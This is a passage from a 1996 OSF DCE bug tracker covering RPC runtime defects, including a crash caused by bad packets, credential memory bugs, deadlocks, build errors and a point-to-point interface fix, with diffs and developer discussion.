+ 		&(((rpc_dg_fpkt_p_t)rqe->pkt)->fhdr.addr)
+ 	 		:(struct sockaddr *) &rqe->from.sa;
+ 	if (
+ #ifdef NAF_IP
+ 		(sp->sa_family != RPC_C_NAF_ID_IP) &&
+ #endif
+ #ifdef NAF_NS
+ 		(sp->sa_family != RPC_C_NAF_ID_NS) &&
+ #endif
+ #ifdef NAF_DNET
+ 		(sp->sa_family != RPC_C_NAF_ID_DNET) &&
+ #endif
+ #ifdef NAF_DDS
+ 		(sp->sa_family != RPC_C_NAF_ID_DDS) &&
+ #endif
+ #ifdef NAF_OSI
+ 		(sp->sa_family != RPC_C_NAF_ID_OSI) &&
+ #endif
+ 	       1 /*For syntax*/
+ 		) {
+         	RPC_DBG_GPRINTF(("(recv_pkt) Bad address family(%d)\n", 
+ 					sp->sa_family));
+         	rqe->frag_len = 0;
+         	rqe->hdrp = NULL;
+         	return (0);
+          }
+ 	 /* Verify address is local. Excercise for the reader ...
+ 	    To be implemented.
+ 	  */
      }
+ 
  
      if (! fwd && recv_len < (rqe->hdrp->len + RPC_C_DG_RAW_PKT_HDR_SIZE))
      {

--=====================_830209947==_
Content-Type: text/plain; charset="us-ascii"


-----------------------------------------------------------

[9/26/96 public]

OT 13631- bad packets crash servers  is probably dup. Added to
inter-dependent CR's pending further investigation.

[10/10/96 public]

Fixed in 1.1 maintenance.



CR Number                     : 13483
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : all variables used after TRY/CATCH need to be volatile
Reported Date                 : 
Found in Baseline             : 1.1
Found Date                    : 
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/30/96 public]
In Solaris, and probably other platforms that implement exception
handlers with setjmp/longjmp, all variables referenced after a TRY/CATCH
block need to be declared volatile. Currently, only the variables used
within the CATCH clause are volatile. These changes are in transarc
delta hyer-17886-need-volatile-in-catch.



CR Number                     : 13482
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : CN Associations use creds from free memory
Reported Date                 : 
Found in Baseline             : 1.1
Found Date                    : 
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/30/96 public]
The CN associations make a copy of the callers credentials for
use in authenticating the messages used to manage the association.
Since there is no ref count, the associations are left with pointers
to free memory when the client frees the binding handle or refreshes
the credentials.

Transarc delta hyer-17352-no-seal-auth-errors moves the creds pointer
into a ref counted structure, and adds code to keep track of how many
associations are using a credential. When a reference to a cred is
released, the creds are kept until there are no more references, so
the associations are not left with pointers to free memory when the
creds are refreshed or the binding handle is freed.

This delta also fixes a problem where the old credentials were freed
before new credentials were obtained in get_tkt, so there was a window
where the binding handle could contain a NULL creds pointer.
rpc__krb_get_tkt was changed to use a temporary variable to obtain the
new credentials, and only free the old credentials when new credentials
were available. This eliminated a core dump in rpc__cn_call_start
if a refresh started between the time the caller checked the creds
and the time the caller allocated the association.



CR Number                     : 13473
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : Association shutdown errors
Reported Date                 : 5/13/96
Found in Baseline             : 1.1
Found Date                    : 5/13/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/15/96 public]
While toubleshooting a connection oriented RPC problem, a test
program reported several Association shutdown errors. These messages
were generated when the client tried to use an association that the
server was trying to shut down. When the client received the shutdown
request, the Association shutdown error was returned to the client
process. When the client tried the call again it was successful.

There should be some code to either keep the association open
long enough for one last RPC call or to try the RPC call again
on a different association.



>>program reported several Association shutdown errors. These messages
>>were generated when the client tried to use an association that the
>>server was trying to shut down. When the client received the shutdown
>>request, the Association shutdown error was returned to the client
>>process. When the client tried the call again it was successful.

I think I understand that you are describing a test scenario in which:

1. The first RPC from a client to a server has been successful, producing
   a subsequent *inactive* client/server association.

2. The server's reclaim thread has detected:
	a. inactive <no call in progress> association
	b. no network traffic over association for <window> period
 	c. no active context handle on association
   The server's reclaim thread sends an 'advisory' shutdown
   request message, (e.g., we have detected the above conditions,
   we recommend that you the client shutdown this association if
   you don't wish to reuse it for another RPC).
3. The client did not (for his/her own reason) choose to shutdown
   this association.
4. The server's reclaim thread has again been activated - after
   a second <window> has elapsed.  It detected that the conditions
   in (2.) *still* exist.  It begins to reclaim the association.
   The server simply closes the underlying connection.  The only
   warning which the client will receive,  (after all, he has
   alaready been advised, by means of the RPC's prescribed protocol),
   is a signal, produced on the client side that an association's
   connection has been broken.
5. Now, finally the client decides to send another RPC.  Client's
   first try to find an inactive association which is already setup
   to the destination in the binding.  If it isn't able to find one,
   it simply sets up another one.  This seems to be what is happening
   here.  Another association is setup to the server and the RPC
   proceeds normally and succeeds.

I assume that you know that the things which you describe are happening
because you have RPC_DEBUG enabled.  I also assume that the client is
reporting that a "association shutdown" is in progress as a function of
it going ahead and setting up another association.

This all seems fairly normal from your description.  Do you have other
info. which might provide further detail?

Thanks

Bob



CR Number                     : 13471
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : server deadlocks refreshing credentials
Reported Date                 : 5/7/96
Found in Baseline             : 1.1
Found Date                    : 6/28/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : cncall.c com.h combind.h combind.c krbclt.c krbdgclt.c rpctimer.c
Sensitivity                   : public

[5/9/96 public]

This problem was discovered by a customer with an Encina client that
was hanging accasionally in rpc__cn_call_start. The problem was caused
by a lack of exception handlers in the kerberos routines that refresh
binding credentials. If a cancel was raised while the credentials were
getting refreshed, the exception would interrupt a pthread_cond_wait
and the credentials would never get unlocked.
 
While trying to reproduce this bug, I get a couple of segmentation
violations when one thread tried to use a credential that
another thread was trying to refresh. Seperate locks are used to
control access to the binding handle and the kerberos information.
There were places where a thread could end up trying to start an RPC
call with a NULL pointer for its kerberos information.
 
I also noticed that the rpc timer thread getting starved when
alot (8) of connection-oriented RPC clients were running at the
same time.

The fix for the original problem was to add exception handlers around
the calls to pthread_cond_wait in the krb routines to unlock the
mutex if the thread was cancelled. To control access to the binding
handles, I added a flag to indicate when a refresh was pending, so
a thread could make sure it had a valid credential before starting
an RPC call.

I bumped the priority of the rpc timer thread to PRI_OTHER_MAX to make
sure it got scheduled.

These changes were incorporated into the DCE 1.1 source in
Transarc delta hyer-17575-deadlock-in-krb.

Bob Hyer
Transarc DCE/DFS Devlopment
bob_hyer@transarc.com



CR Number                     : 13470
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : doc
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : app_ref
Short Description             : rpc_server_use_all_protseqs
does not list all possible errors.
Reported Date                 : 5/4/96
Found in Baseline             : 1.1
Found Date                    : 5/4/96
Severity                      : E
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/4/96 public]

A support customer reported the following:
==========================================
One Line Description : 
	Doc Error: rpc_server_use_all_protseqs does not list all errors 
		  returned.
Full Description : 
	The description for the routine rpc_server_use_all_protseqs
	in the OSF DCE Application Development Reference does not 
	list all the possible errors the could be returned, e.g.,
	rpc_s_no_addrs.

============================================

/project/dce/build/dcedoc1.1/src/dce_books/app_ref/man3rpc
		  /dcedoc1.2/

Both 1.1 and 1.2 app_ref areas for rpc_use_all_protseqs.3rpc list
the same errors. rpc_s_no_addrs, rpc_s_cant_bind_sock, 
rpc_s_invalid_rpc_protseq also appear to be valid return codes. 
This may not be a complete list.

[5/16/96 public]

Assigned to HP.



CR Number                     : 13465
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : doc
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : admin_gd
Short Description             : dcecp log destination must be fully-qualified
Reported Date                 : 4/30/96
Found in Baseline             : 1.2.1
Found Date                    : 4/30/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : admin_gd/rpc/rpc/host_admin.gpsml
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Status               : open

[4/30/96 public]
In the section called Using the dcecp log Object, the definition of
the destination field of the serviceability_routing_specification says
that it may not contain colons (:).  This implies that that DFS
filenames can't be abbreviated /:/<file> but must be spelled out
/.../<cellname>/fs/<file>.  This fact should be stated directly to
avoid any confusion.
Added field Transarc Deltas with value `' 
Added field Transarc Status with value `open'

[5/16/96 public]

Assigned to HP.



CR Number                     : 13446
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : rpc
Subcomponent Name             : 
Short Description             : can't build w/o debug option
Reported Date                 : 4/23/96
Found in Baseline             : 1.1
Found Date                    : 4/23/96
Severity                      : C
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[4/23/96 public]

This OT is being created for Tsuneo Yamaura of Hitachi:

 --------------------------------  OT  -------------------------------------

            To maximize the performance of DCE 1.2.1, we followed the
     instructions mentioned in "4.8 Build Options for Improving DCE
     Performance" on page 4-17 of Release Notes, and tried to build DCE
     1.2.1 *without* debug option to have ended up with a compilation
     error listed in the appendix 01 below.

            The Appendix 02 shows the module that causes the compilation
     error.  The cause of this error is quite simple: RPC__SVC_DBG_MSG_SZ
     and RPC__SVC_DBG_LEVEL used in the module are placed inside the
     "#ifdef DEBUG" in rpcsvc.h, and the definitions of RPC__SVC_DBG_MSG_SZ
     and RPC__SVC_DBG_LEVEL disappear when the debug option is set.

            As a temporary remedy, we commented out RPC__SVC_DBG_MSG_SZ
     and RPC__SVC_DBG_LEVEL to kill the compilation error, and we continued
     the system building.
                                                     Tsuneo Yamaura


     PS: We also found that the same error exists in DCE 1.1.


------------------------------------------------------------------------
-------------------------   appendix 01   ------------------------------
-------------------------  error message  ------------------------------
------------------------------------------------------------------------

xlc -c     -O  -DNCK -DPROT_NCADG -DPROT_NCACN  -DAUTH_KRB -DNAF_IP -DDN
S_CDS -DDNSPI_V3 -DDNS_V3API    -DDCE_RPC_SVC  -Dunix -D_ALL_SOURCE -DNO
_SIOCGIFADDR -D_BSD=44 -D_NONSTD_TYPES  -D_ALL_SOURCE -DAIX32   -I. -I/o
pt2/dce12_src/project/dce/build/dce1.2/src/rpc/runtime  -IRIOS -I/opt2/d
ce12_src/project/dce/build/dce1.2/src/rpc/runtime/RIOS -I/opt2/dce12_src
/project/dce/build/dce1.2/export/rios/usr/include -I/opt2/dce12_src/proj
ect/dce/build/dce1.2/external/rios/usr/include  /opt2/dce12_src/project/
dce/build/dce1.2/src/rpc/runtime/rpcsvc.c
"/opt2/dce12_src/project/dce/build/dce1.2/src/rpc/runtime/rpcsvc.c", lin
e 73.14: 1506-045 (S) Undeclared identifier RPC__SVC_DBG_MSG_SZ.
*** Error code 1
`build_all' not remade because of errors.
*** Error code 1
`build_all' not remade because of errors.
*** Error code 1
`build_all' not remade because of errors.
*** Error code 1
`build_all' not remade because of errors.





------------------------------------------------------------------------
-------------------------   appendix 02   ------------------------------
---------------  source code of the erroneous module  ------------------
------------------------------------------------------------------------

PRIVATE int rpc__svc_eprintf ( char *fmt, ... )
{
                     :
                     :
    char        buf[RPC__SVC_DBG_MSG_SZ];     <------------------------- line 73
    va_list     arg_ptr;

    va_start (arg_ptr, fmt);
    vsprintf (buf, fmt, arg_ptr);
    va_end (arg_ptr);
    DCE_SVC_DEBUG((RPC__SVC_HANDLE, rpc_svc_general, RPC__SVC_DBG_LEVEL <-- l.79
    (0), buf));
    return(0);
}



CR Number                     : 13442
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : cn
Short Description             : CN runtime doesn't scale.
Reported Date                 : 4/19/96
Found in Baseline             : 1.0
Found Date                    : 4/19/96
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[4/19/96 public]

CN runtime is thread hungry. Each association (TCP/IP connection) requires
a dedicated receiver thread. Because of the association caching, the number
of threads (and the open sockets), can be larger than the concurrency
level, i.e., # of call executor threads + max call queue length. Also,
since a client context is maintained by an open socket (per a client
process), it consumes more receiver threads while the context handles are
in-use. We had the customer report of rpcd coredump with over 400 receiver
threads, roughly 40MB of VM on HP-UX. (We tell customers get more swap
spaces, adjust the kernel parameters, etc. ;) It should use one or two
(client/server) receiver threads handling all connections.

Another bad coding in CN runtime is its use of the rpc global mutex.
Basically, any thread which is executing in CN runtime, including the
receiver thread!, holds the rpc global mutex. (It releases it when making
blocking calls, though.) It causes the unfair thread scheduling because if
the thread is holding the rpc global mutex when the time-slice expires, it
will be likely scheduled again blocking other rpc threads, including DG
runtime's threads. It should use smaller locking, e.g., per resources, like
DG runtime.

Fixing the above problems requires substantial reworks of CN runtime
implementation. (Why such an implementation was done in the first place?)



CR Number                     : 13441
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : cn
Short Description             : Multi-threaded CN client may lose the context handle.
Reported Date                 : 4/19/96
Found in Baseline             : 1.0
Found Date                    : 4/19/96
Severity                      : B
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[4/19/96 public]

This is really an architectural defect and the CN protocol specification
needs to be revised to fix it.

The CN runtime maintains the context handle by keeping at least one
association (e.g., TCP/IP connection) open. If there are multiple
associations open between the client and the server, typically the server
chooses which association to leave open. This is because the association
cache timeout is shorter in the server, i.e., 10 seconds
(TIMEOUT_SERVER_DISCONNECT in Appendix K of AES). In the OSF implementaion,
the timeouts are defined in cnassoc.c:

/*
 * The client idle connection disconnect time in seconds.
 * This value is specified in Appendix A of the NCA connection
 * architecture spec. 
 */
#define RPC_C_ASSOC_CLIENT_DISC_TIMER           300

/*
 * The server idle connection disconnect time in seconds.
 * This value is specified in Appendix A of the NCA connection
 * architecture spec. 
 */
#define RPC_C_ASSOC_SERVER_DISC_TIMER           10

However, as I understand it, caching is not mandatory. It is perfectly
legal to close the association before the timeout if resources are scarce,
as long as you satisfy the context handle's requirement, i.e., keep one
open if there is an active context(s). The problem arise when both ends
ramdomly pick which associations to close. For instance, given 3
associations, assoc1, assoc2 and assoc3, the client may close assoc1 and
assoc2 and the server may close assoc1 and assoc3 which leaves no
association at all. Well, it's extremely difficult to produce such a case,
but it's possible. (You can never predict the impact of network delays,
etc.) There should be the protocol defined negotiation to choose which
associaton to leave open.



CR Number                     : 13366
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : rpc/runtime
Short Description             : point to point interfaces not working
Reported Date                 : 2/24/96
Found in Baseline             : 1.1
Found Date                    : 2/24/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/24/96 public]

A support customer reported the following problem:
--------------------------------------------------

<edited version from Customer Support Ticket>

Component (Module):     rpc/runtime/HITM/ipnaf_sys.c 

Date of First Occurrence: 10/20/94

 DESCRIPTION:
 
 The rpc runtime can't find a useable interface when the only interface
 is a point to point interface.  The runtime routine
 enumerate_interfaces() lists and sorts the interfaces as they are found
 into a vector array.  The p2p interafces are loaded into the end of the
 array and then later shuffled into empty slots in the middle of the
 array.  This logic appears to be broke.
 

 DESCRIPTION OF WHERE TEST SUCCESSFULLY RAN:
 
 The enumerate_interfaces routine (in ipnaf_sys.c, taken from the RIOS
 version) did not work correctly.
 
     *** /tmp/ci.6334..ipnaf_sys.c.6368.1	Tue Jun 20 15:15:21 1995
     --- /tmp/ipnaf_sys.c.6368.2	Tue Jun 20 15:15:22 1995
     ***************
     *** 290,300 ****
     --- 290,302 ----
           {
               if (err == EINTR)
               {
                   goto ifconf_again;
               }
     + #ifdef hitm
       	free(buf);
     + #endif
               *status = -2;   /* !!! */
               return;
           }
       
           /*
     ***************
     *** 319,329 ****
     --- 321,333 ----
               RPC_C_MEM_RPC_ADDR_VEC,
               RPC_C_MEM_WAITOK);
           
           if (*rpc_addr_vec == NULL)
           {
     + #ifdef hitm
       	free(buf);
     + #endif
               *status = rpc_s_no_memory;
               return;
           }
           if (netmask_addr_vec != NULL)
           {
     ***************
     *** 497,557 ****
       	** slots in the middle of the array.  Each time we encounter a p2p
       	** interface we increment the np2p variable which (when subtracted
       	** from n_ifs-1) marks the last available slot in the array.
       	*/
       
     - #ifdef hitm  /* Don't put ptp's at end of array, may revisit later. */
     - /*        
     - #endif
               if (if_flags & IFF_POINTOPOINT) {
     !           (*rpc_addr_vec)->addrs[n_ifs-1-nptp++] = (rpc_addr_p_t) ip_addr;
                 if (netmask_addr_vec != NULL && netmask_addr != NULL)
     !               (*netmask_addr_vec)->addrs[n_ifs-1-nptp++]
                         = (rpc_addr_p_t) netmask_addr;
               } else {  
     - #ifdef hitm
     - */
     - #endif
                 (*rpc_addr_vec)->addrs[(*rpc_addr_vec)->len++]=(rpc_addr_p_t) ip_addr;
     !           if (netmask_addr_vec != NULL && netmask_addr != NULL)
                     (*netmask_addr_vec)->addrs[(*netmask_addr_vec)->len++]
                         = (rpc_addr_p_t) netmask_addr;
     ! #ifdef hitm
     ! /*        } */
     ! #else
               }
     - #endif
           }
       
           /*
           ** Shuffle p2p interfaces at the end of the array into empty slots in the
           ** middle, if there are any.
           */
       
     - #ifdef hitm  /* no need to shuffle now.  May revisit later. */
     - /*    
     - #endif
           cnt = (*rpc_addr_vec)->len;
           if ((n_ifs - (cnt + nptp)) < nptp)
             stop = n_ifs - (cnt + nptp);
           else
             stop = nptp;
           stop += cnt;
       
           for (i = cnt, nptp = n_ifs - 1; i < stop; i++, nptp--) {
             (*rpc_addr_vec)->addrs[i] = (*rpc_addr_vec)->addrs[nptp];
     !       (*rpc_addr_vec)->addrs[nptp] = NULL;
             if (netmask_addr_vec != NULL)
             {
                 (*netmask_addr_vec)->addrs[i] = (*netmask_addr_vec)->addrs[nptp];
     !           (*netmask_addr_vec)->addrs[nptp] = NULL;
             }
           }
     - #ifdef hitm
     - */
     - #endif
       
       /* CMVC 3687 End */
       
       /*
       ** Prior to CMVC 3687
       **      (*rpc_addr_vec)->addrs[(*rpc_addr_vec)->len++] = (rpc_addr_p_t) ip_addr;
     --- 501,550 ----
       	** slots in the middle of the array.  Each time we encounter a p2p
       	** interface we increment the np2p variable which (when subtracted
       	** from n_ifs-1) marks the last available slot in the array.
       	*/
       
               if (if_flags & IFF_POINTOPOINT) {
     !           (*rpc_addr_vec)->addrs[n_ifs-1-nptp] = (rpc_addr_p_t) ip_addr;
                 if (netmask_addr_vec != NULL && netmask_addr != NULL)
     !               (*netmask_addr_vec)->addrs[n_ifs-1-nptp]
                         = (rpc_addr_p_t) netmask_addr;
     +           nptp++;       /* hitm */
               } else {  
                 (*rpc_addr_vec)->addrs[(*rpc_addr_vec)->len++]=(rpc_addr_p_t) ip_addr;
     !           if (netmask_addr_vec != NULL) /* netmask_addr will be valid */
                     (*netmask_addr_vec)->addrs[(*netmask_addr_vec)->len++]
                         = (rpc_addr_p_t) netmask_addr;
     ! 
               }
           }
       
           /*
           ** Shuffle p2p interfaces at the end of the array into empty slots in the
           ** middle, if there are any.
           */
       
           cnt = (*rpc_addr_vec)->len;
           if ((n_ifs - (cnt + nptp)) < nptp)
             stop = n_ifs - (cnt + nptp);
           else
             stop = nptp;
     + #ifndef hitm    /* wrong wrong wrong!  do not increase "stop" further! */
           stop += cnt;
     + #endif
       
           for (i = cnt, nptp = n_ifs - 1; i < stop; i++, nptp--) {
             (*rpc_addr_vec)->addrs[i] = (*rpc_addr_vec)->addrs[nptp];
     !       (*rpc_addr_vec)->len++;   /* no need to null addrs[nptp] */
             if (netmask_addr_vec != NULL)
             {
                 (*netmask_addr_vec)->addrs[i] = (*netmask_addr_vec)->addrs[nptp];
     !           (*netmask_addr_vec)->len++;   /* no need to null addrs[nptp] */
             }
           }
       
     + 
       /* CMVC 3687 End */
       
       /*
       ** Prior to CMVC 3687
       **      (*rpc_addr_vec)->addrs[(*rpc_addr_vec)->len++] = (rpc_addr_p_t) ip_addr;
     ***************
     *** 559,569 ****
     --- 552,564 ----
       */
       
       #undef max
       #undef size
       
     + #ifdef hitm
           free(buf);
     + #endif
           *status = rpc_s_ok;
           return;
       
       FREE_IT:
       
     ***************
     *** 579,589 ****
     --- 574,586 ----
               {
                   RPC_MEM_FREE ((*netmask_addr_vec)->addrs[i], RPC_C_MEM_RPC_ADDR);
               }
               RPC_MEM_FREE (*netmask_addr_vec, RPC_C_MEM_RPC_ADDR_VEC);
           }
     + #ifdef hitm
           free(buf);
     + #endif
       }
       
       /*
       **++
       **
 
Related-file:::: Resolution 
 DESCRIPTION OF BUG FIX:  The enumerate_interfaces() routine had no
 fewer than three bugs in the code to handle point-to-point
 interfaces (we took our version from the RIOS version):
 
   1)  If there were both a rpc_addr_vec and a netmask_addr_vec,
       nptp would be incremented twice when a value was loaded
       into the arrays
   2)  The computation of "stop" incorrectly incremented stop by
       the value of "cnt."
   3)  The compression of the rpc_addr_vec and netmask_addr_vec
       arrays didn't adjust the vec->len values.  Instead, it
       pointlessly zeroed out the entries that had been shifted
       down in the array.
  
 REGRESSION TEST SCENARIO:  Just starting dced on a node with
 point-to-point interfaces should show very weird behavior.
 
 DESCRIPTION OF WHERE TEST SUCCESSFULLY RAN:
 
Related-file::Added 950620 by wright:: /build/hiosfm/RCS/dce1.1/src/rpc/runtime/HITM/./ipnaf_sys.c,v 8.3
 /build/hiosfm/RCS/dce1.1/src/rpc/runtime/HITM/./ipnaf_sys.c,v 8.3
 wright 1995/06/20 19:15:19 +20 -23
 Reason:  OSDqa09650 RPC runtime can't get useable interface with point to point.
 The enumerate_interfaces routine (in ipnaf_sys.c, taken from the RIOS
 version) did not work correctly.
 
     *** /tmp/ci.6334..ipnaf_sys.c.6368.1	Tue Jun 20 15:15:21 1995
     --- /tmp/ipnaf_sys.c.6368.2	Tue Jun 20 15:15:22 1995
     ***************
     *** 290,300 ****
     --- 290,302 ----
           {
               if (err == EINTR)
               {
                   goto ifconf_again;
               }
     + #ifdef hitm
       	free(buf);
     + #endif
               *status = -2;   /* !!! */
               return;
           }
       
           /*
     ***************
     *** 319,329 ****
     --- 321,333 ----
               RPC_C_MEM_RPC_ADDR_VEC,
               RPC_C_MEM_WAITOK);
           
           if (*rpc_addr_vec == NULL)
           {
     + #ifdef hitm
       	free(buf);
     + #endif
               *status = rpc_s_no_memory;
               return;
           }
           if (netmask_addr_vec != NULL)
           {
     ***************
     *** 497,557 ****
       	** slots in the middle of the array.  Each time we encounter a p2p
       	** interface we increment the np2p variable which (when subtracted
       	** from n_ifs-1) marks the last available slot in the array.
       	*/
       
     - #ifdef hitm  /* Don't put ptp's at end of array, may revisit later. */
     - /*        
     - #endif
               if (if_flags & IFF_POINTOPOINT) {
     !           (*rpc_addr_vec)->addrs[n_ifs-1-nptp++] = (rpc_addr_p_t) ip_addr;
                 if (netmask_addr_vec != NULL && netmask_addr != NULL)
     !               (*netmask_addr_vec)->addrs[n_ifs-1-nptp++]
                         = (rpc_addr_p_t) netmask_addr;
               } else {  
     - #ifdef hitm
     - */
     - #endif
                 (*rpc_addr_vec)->addrs[(*rpc_addr_vec)->len++]=(rpc_addr_p_t) ip_addr;
     !           if (netmask_addr_vec != NULL && netmask_addr != NULL)
                     (*netmask_addr_vec)->addrs[(*netmask_addr_vec)->len++]
                         = (rpc_addr_p_t) netmask_addr;
     ! #ifdef hitm
     ! /*        } */
     ! #else
               }
     - #endif
           }
       
           /*
           ** Shuffle p2p interfaces at the end of the array into empty slots in the
           ** middle, if there are any.
           */
       
     - #ifdef hitm  /* no need to shuffle now.  May revisit later. */
     - /*    
     - #endif
           cnt = (*rpc_addr_vec)->len;
           if ((n_ifs - (cnt + nptp)) < nptp)
             stop = n_ifs - (cnt + nptp);
           else
             stop = nptp;
           stop += cnt;
       
           for (i = cnt, nptp = n_ifs - 1; i < stop; i++, nptp--) {
             (*rpc_addr_vec)->addrs[i] = (*rpc_addr_vec)->addrs[nptp];
     !       (*rpc_addr_vec)->addrs[nptp] = NULL;
             if (netmask_addr_vec != NULL)
             {
                 (*netmask_addr_vec)->addrs[i] = (*netmask_addr_vec)->addrs[nptp];
     !           (*netmask_addr_vec)->addrs[nptp] = NULL;
             }
           }
     - #ifdef hitm
     - */
     - #endif
       
       /* CMVC 3687 End */
       
       /*
       ** Prior to CMVC 3687
       **      (*rpc_addr_vec)->addrs[(*rpc_addr_vec)->len++] = (rpc_addr_p_t) ip_addr;
     --- 501,550 ----
       	** slots in the middle of the array.  Each time we encounter a p2p
       	** interface we increment the np2p variable which (when subtracted
       	** from n_ifs-1) marks the last available slot in the array.
       	*/
       
               if (if_flags & IFF_POINTOPOINT) {
     !           (*rpc_addr_vec)->addrs[n_ifs-1-nptp] = (rpc_addr_p_t) ip_addr;
                 if (netmask_addr_vec != NULL && netmask_addr != NULL)
     !               (*netmask_addr_vec)->addrs[n_ifs-1-nptp]
                         = (rpc_addr_p_t) netmask_addr;
     +           nptp++;       /* hitm */
               } else {  
                 (*rpc_addr_vec)->addrs[(*rpc_addr_vec)->len++]=(rpc_addr_p_t) ip_addr;
     !           if (netmask_addr_vec != NULL) /* netmask_addr will be valid */
                     (*netmask_addr_vec)->addrs[(*netmask_addr_vec)->len++]
                         = (rpc_addr_p_t) netmask_addr;
     ! 
               }
           }
       
           /*
           ** Shuffle p2p interfaces at the end of the array into empty slots in the
           ** middle, if there are any.
           */
       
           cnt = (*rpc_addr_vec)->len;
           if ((n_ifs - (cnt + nptp)) < nptp)
             stop = n_ifs - (cnt + nptp);
           else
             stop = nptp;
     + #ifndef hitm    /* wrong wrong wrong!  do not increase "stop" further! */
           stop += cnt;
     + #endif
       
           for (i = cnt, nptp = n_ifs - 1; i < stop; i++, nptp--) {
             (*rpc_addr_vec)->addrs[i] = (*rpc_addr_vec)->addrs[nptp];
     !       (*rpc_addr_vec)->len++;   /* no need to null addrs[nptp] */
             if (netmask_addr_vec != NULL)
             {
                 (*netmask_addr_vec)->addrs[i] = (*netmask_addr_vec)->addrs[nptp];
     !           (*netmask_addr_vec)->len++;   /* no need to null addrs[nptp] */
             }
           }
       
     + 
       /* CMVC 3687 End */
       
       /*
       ** Prior to CMVC 3687
       **      (*rpc_addr_vec)->addrs[(*rpc_addr_vec)->len++] = (rpc_addr_p_t) ip_addr;
     ***************
     *** 559,569 ****
     --- 552,564 ----
       */
       
       #undef max
       #undef size
       
     + #ifdef hitm
           free(buf);
     + #endif
           *status = rpc_s_ok;
           return;
       
       FREE_IT:
       
     ***************
     *** 579,589 ****
     --- 574,586 ----
               {
                   RPC_MEM_FREE ((*netmask_addr_vec)->addrs[i], RPC_C_MEM_RPC_ADDR);
               }
               RPC_MEM_FREE (*netmask_addr_vec, RPC_C_MEM_RPC_ADDR_VEC);
           }
     + #ifdef hitm
           free(buf);
     + #endif
       }
       
       /*
       **++
       **
 
Related-file:::: Resolution 
 DESCRIPTION OF BUG FIX:  The enumerate_interfaces() routine had no
 fewer than three stupid bugs in the code to handle point-to-point
 interfaces (we took our version from the RIOS version, which had
 clearly never been tested):
 
   1)  If there were both a rpc_addr_vec and a netmask_addr_vec,
       nptp would be incremented twice when a value was loaded
       into the arrays
   2)  The computation of "stop" incorrectly incremented stop by
       the value of "cnt."
   3)  The compression of the rpc_addr_vec and netmask_addr_vec
       arrays didn't adjust the vec->len values.  Instead, it
       pointlessly zeroed out the entries that had been shifted
       down in the array.
  
 Three bugs in about 25 lines; not bad.
 
 REGRESSION TEST SCENARIO:  Just starting dced on a node with
 point-to-point interfaces should show very weird behavior.

[ axg 2/24/96 public]

removed miscellaneous email correspondence



CR Number                     : 13350
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : invalid use of socket desciptor CN rpc runtime.
Reported Date                 : 2/21/96
Found in Baseline             : 1.1
